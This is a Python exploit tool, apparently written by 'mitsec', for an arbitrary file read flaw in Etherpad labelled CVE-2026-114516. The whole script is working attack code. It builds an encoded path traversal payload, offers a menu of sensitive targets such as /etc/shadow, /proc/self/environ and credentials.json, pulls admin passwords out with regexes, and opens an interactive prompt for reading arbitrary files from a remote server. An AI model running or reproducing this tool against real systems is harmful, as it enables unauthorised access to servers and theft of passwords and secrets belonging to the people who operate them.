#!/usr/bin/env python3
"""
ep-afr.py — Etherpad Arbitrary File Read (CVE-2026-114516)
Author: mitsec
Usage:
  python3 ep-afr.py -u http://target:9001
  → Vulnerable ise numaralı interaktif shell
"""

import argparse
import concurrent.futures
import re
import sys
import readline
import os
import urllib3
from typing import Optional, Dict, Any, List

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] requests kütüphanesi gerekli: pip install requests")
    sys.exit(1)

class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"

BANNER = f"""{C.CYAN}{C.BOLD}
  ███████╗██████╗       █████╗ ███████╗██████╗ 
  ██╔════╝██╔══██╗     ██╔══██╗██╔════╝██╔══██╗
  █████╗  ██████╔╝     ███████║█████╗  ██████╔╝
  ██╔══╝  ██╔═══╝      ██╔══██║██╔══╝  ██╔══██╗
  ███████╗██║          ██║  ██║██║     ██║  ██║
  ╚══════╝╚═╝          ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
{C.RESET}{C.GRAY}  Etherpad AFR • CVE-2026-114516 • mitsec{C.RESET}
"""

DEFAULT_DEPTH = 8
DEFAULT_TIMEOUT = 12

# Numbered menu of interesting files
MENU = [
    ("/etc/passwd",                    "passwd"),
    ("/etc/shadow",                    "shadow"),
    ("/proc/self/cwd/settings.json",   "settings.json"),
    ("/proc/self/cwd/credentials.json","credentials.json"),
    ("/proc/self/environ",             "environ (env vars)"),
    ("/etc/hosts",                     "hosts"),
    ("/etc/issue",                     "issue"),
    ("/proc/self/cwd/package.json",    "package.json"),
    ("/proc/self/cwd/var/etherpad.sq3","sqlite db"),
    ("/root/.bash_history",            "root history"),
    ("/home/*/.bash_history",          "user history (try)"),
    ("/proc/self/cmdline",             "cmdline"),
]

config = {
    "target": None,
    "depth": DEFAULT_DEPTH,
    "timeout": DEFAULT_TIMEOUT,
    "proxy": None,
    "verbose": False,
    "no_color": False,
}

last_content = ""


def color(text: str, c: str) -> str:
    return f"{c}{text}{C.RESET}" if not config.get("no_color") else text


def create_session(proxy: Optional[str] = None, timeout: int = DEFAULT_TIMEOUT) -> requests.Session:
    session = requests.Session()
    retries = Retry(total=1, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; ep-afr/1.0; +mitsec)",
        "Accept": "*/*",
    })
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    session.timeout = timeout
    session.verify = False
    return session


def build_payload(target_file: str, depth: int = DEFAULT_DEPTH) -> str:
    traversal = "..%5C" * depth
    clean_file = target_file.lstrip("/")
    return f"/static/plugins/ep_etherpad-lite/static/{traversal}{clean_file}"


def is_likely_vulnerable(content: str, target_file: str) -> bool:
    if not content or len(content) < 8:
        return False
    lower = content.lower()
    if "root:" in content and any(x in content for x in ["/bin/", "/usr/", "nologin", "false"]):
        return True
    if any(k in lower for k in ["adminpassword", "\"users\"", "\"password\"", "sessionkey"]):
        return True
    if any(k in content for k in ["ADMIN_PASSWORD", "NODE_ENV", "PATH=", "HOME="]):
        return True
    if target_file.endswith(".json") and "{" in content and "}" in content:
        return True
    if "root:" in content and ("$" in content or "!" in content):
        return True
    return False


def extract_admin_password(content: str) -> Optional[str]:
    patterns = [
        r'"adminPassword"\s*:\s*"([^"]+)"',
        r'"adminpassword"\s*:\s*"([^"]+)"',
        r'ADMIN_PASSWORD=([^\s&]+)',
        r'ADMINPASSWORD=([^\s&]+)',
    ]
    for pat in patterns:
        m = re.search(pat, content, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def read_file(url: str, file_path: str, depth: int, session: requests.Session) -> Dict[str, Any]:
    result = {
        "vulnerable": False,
        "status": None,
        "length": 0,
        "admin_password": None,
        "content": None,
        "error": None,
    }
    base = url.rstrip("/")
    full_url = base + build_payload(file_path, depth)
    try:
        resp = session.get(full_url, allow_redirects=False, timeout=session.timeout, verify=False)
        result["status"] = resp.status_code
        content = resp.text
        result["length"] = len(content)
        result["content"] = content
        if resp.status_code == 200 and is_likely_vulnerable(content, file_path):
            result["vulnerable"] = True
            result["admin_password"] = extract_admin_password(content)
    except requests.exceptions.Timeout:
        result["error"] = "timeout"
    except requests.exceptions.ConnectionError:
        result["error"] = "connection error"
    except Exception as e:
        result["error"] = str(e)
    return result


def print_menu():
    print(color("\n  Available files:", C.CYAN + C.BOLD))
    for i, (path, desc) in enumerate(MENU, 1):
        print(f"  {color(str(i).rjust(2), C.YELLOW)}  {desc:22} {color(path, C.GRAY)}")
    print(f"  {color(' c', C.YELLOW)}  custom path")
    print(f"  {color(' d', C.YELLOW)}  dump last content")
    print(f"  {color(' q', C.YELLOW)}  quit")
    print()


def interactive_shell():
    global last_content
    print()
    print(color("[+] Vulnerable — interactive mode", C.GREEN + C.BOLD))
    print_menu()

    session = create_session(config["proxy"], config["timeout"])
    target = config["target"]

    histfile = os.path.expanduser("~/.ep-afr_history")
    try:
        readline.read_history_file(histfile)
    except FileNotFoundError:
        pass

    while True:
        try:
            prompt = color("ep-afr", C.CYAN + C.BOLD) + color("> ", C.GRAY)
            line = input(prompt).strip().lower()
            if not line:
                continue

            if line in ("q", "quit", "exit"):
                try:
                    readline.write_history_file(histfile)
                except:
                    pass
                print(color("Bye.", C.GRAY))
                break

            if line in ("m", "menu", "help", "h", "?"):
                print_menu()
                continue

            if line in ("d", "dump"):
                if last_content:
                    print(color("\n----- CONTENT -----", C.YELLOW))
                    print(last_content)
                    print(color("-------------------", C.YELLOW))
                else:
                    print(color("[!] Nothing to dump", C.RED))
                continue

            # Custom path
            if line in ("c", "custom"):
                path = input(color("  path> ", C.GRAY)).strip()
                if not path:
                    continue
                print(color(f"[*] Reading {path}", C.CYAN))
                res = read_file(target, path, config["depth"], session)
                if res["vulnerable"] and res["content"]:
                    last_content = res["content"]
                    print(color(f"[+] OK ({res['length']} bytes)", C.GREEN))
                    if res.get("admin_password"):
                        print(color(f"    admin_password: {res['admin_password']}", C.YELLOW + C.BOLD))
                    print(color("\n----- CONTENT -----", C.YELLOW))
                    print(res["content"][:4000])
                    if len(res["content"]) > 4000:
                        print(color("... [truncated, 'd' for full]", C.GRAY))
                    print(color("-------------------", C.YELLOW))
                else:
                    print(color(f"[-] Failed or empty (status={res.get('status')})", C.RED))
                continue

            # Numeric selection
            if line.isdigit():
                idx = int(line)
                if 1 <= idx <= len(MENU):
                    path, desc = MENU[idx - 1]
                    print(color(f"[*] Reading {desc} ({path})", C.CYAN))
                    res = read_file(target, path, config["depth"], session)
                    if res["vulnerable"] and res["content"]:
                        last_content = res["content"]
                        print(color(f"[+] OK ({res['length']} bytes)", C.GREEN))
                        if res.get("admin_password"):
                            print(color(f"    admin_password: {res['admin_password']}", C.YELLOW + C.BOLD))
                        print(color("\n----- CONTENT -----", C.YELLOW))
                        print(res["content"][:4000])
                        if len(res["content"]) > 4000:
                            print(color("... [truncated, type 'd' for full]", C.GRAY))
                        print(color("-------------------", C.YELLOW))
                    else:
                        err = res.get("error") or f"status={res.get('status')}"
                        print(color(f"[-] Failed ({err})", C.RED))
                else:
                    print(color(f"[!] Invalid number (1-{len(MENU)})", C.RED))
                continue

            print(color("[!] Unknown. Type number, 'c', 'd', 'm' or 'q'", C.RED))

        except KeyboardInterrupt:
            print("\n" + color("Use 'q' to quit", C.GRAY))
        except EOFError:
            print()
            break
        except Exception as e:
            print(color(f"[!] {e}", C.RED))


def main():
    parser = argparse.ArgumentParser(description="ep-afr — Etherpad Arbitrary File Read (CVE-2026-114516)")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-d", "--depth", type=int, default=DEFAULT_DEPTH, help="Traversal depth")
    parser.add_argument("-p", "--proxy", help="Proxy")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--no-color", action="store_true")
    parser.add_argument("--no-shell", action="store_true", help="Don't enter shell")

    args = parser.parse_args()

    config["no_color"] = args.no_color
    config["depth"] = args.depth
    config["timeout"] = args.timeout
    config["proxy"] = args.proxy
    config["target"] = args.url.rstrip("/")

    print(BANNER)

    session = create_session(config["proxy"], config["timeout"])
    print(color(f"[*] Checking {config['target']}", C.CYAN))

    # Initial check with /etc/passwd
    res = read_file(config["target"], "/etc/passwd", config["depth"], session)

    if res["vulnerable"]:
        print(color("[+] VULNERABLE", C.GREEN + C.BOLD))
        print(color(f"    /etc/passwd read OK ({res['length']} bytes)", C.GREEN))
        if not args.no_shell:
            interactive_shell()
    else:
        err = res.get("error") or f"status={res.get('status')}"
        print(color(f"[-] Not vulnerable or unreachable ({err})", C.RED))


if __name__ == "__main__":
    main()
